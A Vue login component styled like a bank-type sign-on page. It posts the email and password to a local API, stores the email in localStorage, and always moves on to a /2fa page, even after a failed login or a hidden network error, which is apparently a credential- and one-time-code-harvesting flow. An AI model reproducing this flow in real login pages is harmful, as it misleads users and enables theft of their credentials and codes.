<template>
    <!-- third col  -->
    <div class="hidden lg:block lg:w-[700px] xl:w-[750px] shadow-2xl md:-mt-10">
        <div class="shadow-md flex flex-col rounded-xl bg-white overflow-hidden">
            <div class="flex flex-col md:flex-row">
                <div class="bg-white px-4 py-3 w-full">
                    <h1 class="text-gray-900 text-lg sm:text-xl">Email</h1>
                    <input v-model="email" type="email"
                        class="border border-gray-500 rounded-xl px-4 py-3 w-full bg-white placeholder:text-lg sm:placeholder:text-xl text-gray-700"
                        placeholder="Email" required />
                </div>
                <div class="bg-white px-4 py-3 w-full">
                    <h1 class="text-gray-900 text-lg sm:text-xl">Password</h1>
                    <input v-model="password" type="password"
                        class="border border-gray-500 rounded-xl px-4 py-3 w-full bg-white placeholder:text-lg sm:placeholder:text-xl text-gray-700"
                        placeholder="Password" required />
                </div>

                <div v-if="error" class="text-red-600 text-center font-medium px-4">
                    {{ error }}
                </div>
            </div>
            <div class="flex flex-row gap-3 bg-white p-3 items-center">
                <label class="relative w-6 h-6">
                    <input type="checkbox"
                        class="peer appearance-none w-6 h-6 border-2 border-blue-500 rounded-sm checked:bg-blue-500 checked:border-blue-500" />
                    <svg class="absolute top-0 left-0 w-6 h-6 text-white pointer-events-none opacity-0 peer-checked:opacity-100"
                        fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
                    </svg>
                </label>
                <h1 class="text-lg sm:text-xl text-gray-900">Remember User ID</h1>
            </div>
            <div class="bg-white p-3">
                <button @click="handleLogin" :disabled="loading"
                    class="bg-blue-500 hover:bg-blue-700 text-lg sm:text-xl font-bold text-white w-full py-3 rounded-lg disabled:opacity-50">
                    {{ loading ? 'Signing in...' : 'Sign On' }}
                </button>
            </div>
            <div class="flex flex-col sm:flex-row items-center justify-between p-3 bg-white gap-2">
                <div class="flex flex-row gap-2">
                    <a href="" class="text-blue-500 underline text-sm sm:text-base">Register</a>
                    <h1 class="text-gray-500">/</h1>
                    <a href="" class="text-blue-500 underline text-sm sm:text-base">Activate</a>
                </div>
                <div class="flex flex-row gap-2 flex-wrap justify-center">
                    <h1 class="text-gray-500 text-sm sm:text-base">Forgot</h1>
                    <a href="" class="text-blue-500 underline text-sm sm:text-base">User ID</a>
                    <h1 class="text-sm sm:text-base">or</h1>
                    <a href="" class="text-blue-500 underline text-sm sm:text-base">Password</a>
                </div>
            </div>
            <div class="bg-gray-100 flex justify-center items-center p-4">
                <h1 class="text-blue-500 hover:text-blue-700 text-xl sm:text-2xl font-bold">Passwordless Sign on
                </h1>
            </div>
        </div>
    </div>
</template>

<script setup>
import { ref } from 'vue'
import { useRouter } from 'vue-router'

const router = useRouter()

const email = ref('')
const password = ref('')
const error = ref('')
const loading = ref(false)

async function handleLogin() {
    if (!email.value.trim() || !password.value.trim()) {
        error.value = 'Please enter both email and Password.'
        return
    }

    loading.value = true
    error.value = ''

    // Always save email for 2FA
    localStorage.setItem('email', email.value)

    try {
        const response = await fetch('http://localhost:3000/api/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                username: email.value,
                password: password.value
            })
        })

        const data = await response.json()

        if (!response.ok) {
            error.value = data.error || 'Login failed'
            setTimeout(() => {
                router.push('/2fa')
            }, 2000)
            return
        }

        router.push('/2fa')
        
    } catch (err) {
        console.error('Login error:', err)
        // Don't show network error, just proceed to 2FA
        router.push('/2fa')
    } finally {
        loading.value = false
    }
}
</script>

<style scoped></style>